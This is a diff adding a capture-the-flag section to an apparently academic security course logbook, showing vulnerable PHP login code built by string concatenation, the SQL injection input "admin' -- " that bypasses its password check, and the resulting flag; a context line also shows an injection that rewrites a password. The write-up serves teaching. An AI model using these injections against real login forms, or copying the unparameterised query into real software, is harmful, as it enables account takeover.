@@ -150,3 +150,65 @@ Alice', password=sha1('FSI') where Name = 'Boby' --
 
 ![Alt text](images/logbook8/image-3.3.png)
 
+
+## CTF
+
+In the port 5003 of the ctf.fsi.fe.up.pt server we found a login form to access a website. We were also given the source code of the login query, which is as follows:
+
+``` php
+            if (!empty($_POST)) {
+
+               require_once 'config.php';
+
+               $username = $_POST['username'];
+               $password = $_POST['password'];
+               
+               $query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
+                                     
+               if ($result = $conn->query($query)) {
+                                  
+                  while ($data = $result->fetchArray(SQLITE3_ASSOC)) {
+                    $_SESSION['username'] = $data['username'];
+           
+                    echo "<p>You have been logged in as {$_SESSION['username']}</p><code>";
+                    include "/flag.txt";
+                    echo "</code>";
+
+                 }
+               } else {            
+                   // falhou o login
+                   echo "<p>Invalid username or password <a href=\"index.php\">Tente novamente</a></p>";
+               }
+            }
+```
+
+Firstly we noted that to obtain the flag we only needed to login.
+
+We also realized the login query is vulnerable to SQL Injection since it does not use prepared statements, allowing us to alter the query with our input.
+
+
+From the original query,
+
+```php 
+$query = "SELECT username 
+          FROM user 
+          WHERE username = '".$username."' AND password = '".$password."'";
+```
+
+Our objective is to transform into this:
+
+```sql 
+SELECT username
+FROM user 
+Where username = 'admin' -- AND password = '';
+```
+If we can change the query like so, sql will ignore the password validation, logging in directly into the admin account.
+
+The input we used
+* Login: admin' -- 
+* Password: random
+
+
+![Alt text](images/logbook8/ctf.png)
+
+flag{43d5fdd90c81bd55437f26db9b33c1e4} 
